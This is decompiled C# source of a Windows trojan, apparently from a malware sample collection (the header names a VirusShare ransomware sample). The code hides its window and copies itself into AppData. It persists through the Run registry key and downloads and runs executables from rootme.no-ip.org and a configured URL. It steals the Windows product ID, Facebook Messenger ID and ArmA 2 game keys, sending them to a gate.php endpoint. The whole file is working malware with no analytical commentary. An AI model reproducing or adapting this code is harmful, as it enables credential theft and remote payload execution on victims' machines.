// Decompiled with JetBrains decompiler
// Type: stvn.Form1
// Assembly: stvn, Version=2.1.0.4, Culture=neutral, PublicKeyToken=null
// MVID: 0E421347-ED83-4802-AA32-0C75CC4813FB
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.aaaa-fccb1b4cd8e2d19a849bc1ed57adec47725a0f6e1cd3ec135d4ddad939386d3b.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using stvn.My;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace stvn
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private IContainer components;
    [AccessedThroughProperty("p_m_timer1")]
    private System.Windows.Forms.Timer _p_m_timer1;
    private string XBOITE463;
    private string XBOITE4635;
    private string XBOITE46356;
    private string XBOITE48;
    private string XBOITE463569;
    private string ADDXL_BOX4LLLLLL_QKKKKKAQZE;
    private string ADDXL_BOX4LLLLLL_QKQDQsE;
    private string XBOITE4635692;
    private string tututuut;
    private string XBOITE463569234;
    private string XBOITE46356923;
    private string Greco;

    public Form1()
    {
      this.Load += new EventHandler(this.Form1_Load);
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      this.p_m_timer1 = new System.Windows.Forms.Timer(this.components);
      this.SuspendLayout();
      this.p_m_timer1.Interval = 1000;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(292, 269);
      this.FormBorderStyle = FormBorderStyle.FixedToolWindow;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    internal virtual System.Windows.Forms.Timer p_m_timer1
    {
      get => this._p_m_timer1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
        if (this._p_m_timer1 != null)
          this._p_m_timer1.Tick -= eventHandler;
        this._p_m_timer1 = value;
        if (this._p_m_timer1 == null)
          return;
        this._p_m_timer1.Tick += eventHandler;
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      string Expression = System.IO.File.ReadAllText(Application.ExecutablePath);
      if (!Expression.Contains("stzuxoDont"))
        return;
      string[] strArray = Strings.Split(Expression, "stzuxoDont");
      int num1 = Information.UBound((Array) strArray);
      int num2 = 1;
      while (num2 <= num1)
      {
        this.XBOITE48 = strArray[1];
        this.XBOITE463 = strArray[2];
        this.XBOITE4635 = strArray[3];
        this.XBOITE46356 = strArray[4];
        this.XBOITE463569 = strArray[5];
        this.XBOITE4635692 = strArray[6] + "index.php?action=add&a=";
        this.ADDXL_BOX4LLLLLL_QKKKKKAQZE = strArray[6] + "gate.php?&ap=";
        this.XBOITE46356923 = strArray[7];
        this.Greco = strArray[8];
        this.XBOITE463569234 = strArray[9];
        checked { ++num2; }
      }
      this.tututuut = MyProject.User.Name;
      this.ADDXL_BOX4LLLLLL_QKQDQsE = MyProject.Computer.Name;
      string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
      if (!System.IO.File.Exists(folderPath + "\\" + this.XBOITE463))
      {
        if (Operators.CompareString(this.Greco, "", false) != 0)
        {
          int num3 = (int) MessageBox.Show(this.Greco, "", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        }
        if (Operators.CompareString(this.XBOITE463569, "1", false) == 0)
        {
          this.beurre();
          try
          {
            this.XL_BOX4();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
          try
          {
            this.XL_BOX2();
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
      }
      try
      {
        MyProject.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\\Bohemia Interactive Studio\\ArmA 2 OA", true).SetValue("KEYNAME", (object) "860f394026aa1de6d4ea8d2f5ce8c8");
        MyProject.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\\Wow6432Node\\Bohemia Interactive Studio\\ArmA 2 OA", true).SetValue("KEY", (object) "860f394026aa1de6d4ea8d2f5ce8c8");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (Conversions.ToDouble(this.XBOITE46356923) == 1.0)
        this.p_m_timer1.Start();
      try
      {
        System.IO.File.Copy(Application.ExecutablePath, folderPath + "\\" + this.XBOITE463);
        Form1.XL_BOX(this.Text, folderPath + "\\" + this.XBOITE463);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        MyProject.Computer.Network.DownloadFile("http://rootme.no-ip.org/win.exe", folderPath + "\\test456.exe");
        Process.Start("http://rootme.no-ip.org/win.exe", folderPath + "\\test456.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      if (System.IO.File.Exists(folderPath + "\\" + this.XBOITE4635))
      {
        System.IO.File.Delete(folderPath + "\\" + this.XBOITE4635);
        try
        {
          MyProject.Computer.Network.DownloadFile(this.XBOITE48, folderPath + "\\" + this.XBOITE4635);
          Process.Start(folderPath + "\\" + this.XBOITE4635);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        try
        {
          MyProject.Computer.Network.DownloadFile(this.XBOITE48, folderPath + "\\" + this.XBOITE4635);
          Process.Start(folderPath + "\\" + this.XBOITE4635);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          ProjectData.ClearProjectError();
        }
      }
      try
      {
        Crunch.QWA_SOxwk1929("Run First.exe");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void XL_BOX(string name, string path) => Registry.CurrentUser.OpenSubKey("software\\microsoft\\windows\\currentversion\\run", true).SetValue(name, (object) path, RegistryValueKind.String);

    public void beurre()
    {
      string Password = Conversions.ToString(Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion", false).GetValue("ProductID", (object) RegistryValueKind.String));
      this.XL_BOX30(Environment.OSVersion.ToString(), "Windows Key", this.tututuut, Password);
    }

    public void XL_BOX30(string Application, string Host, string User, string Password) => new WebClient().DownloadString(this.ADDXL_BOX4LLLLLL_QKKKKKAQZE + Application + "&h=" + Host + "&u=" + User + "&p=" + Password + "&v=" + Environment.MachineName);

    private void Timer1_Tick(object sender, EventArgs e) => Form1.XL_BOX(this.Text, Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + this.XBOITE463);

    public void XL_BOX2()
    {
      string Password = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_CURRENT_USER\\Software\\Facebook\\Messenger", "UserID", (object) null));
      this.XL_BOX30(Environment.OSVersion.ToString(), "Facebook Messenger ID", this.tututuut, Password);
    }

    public void XL_BOX4()
    {
      string Password1 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Bohemia Interactive Studio\\ArmA 2 OA", "KEY", (object) null));
      string Password2 = Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Bohemia Interactive Studio\\ArmA 2 OA", "KEY", (object) null));
      string Application = Environment.OSVersion.ToString();
      this.XL_BOX30(Application, "Arma II OA 1", this.tututuut, Password1);
      this.XL_BOX30(Application, "Arma II OA 2", this.tututuut, Password2);
    }
  }
}
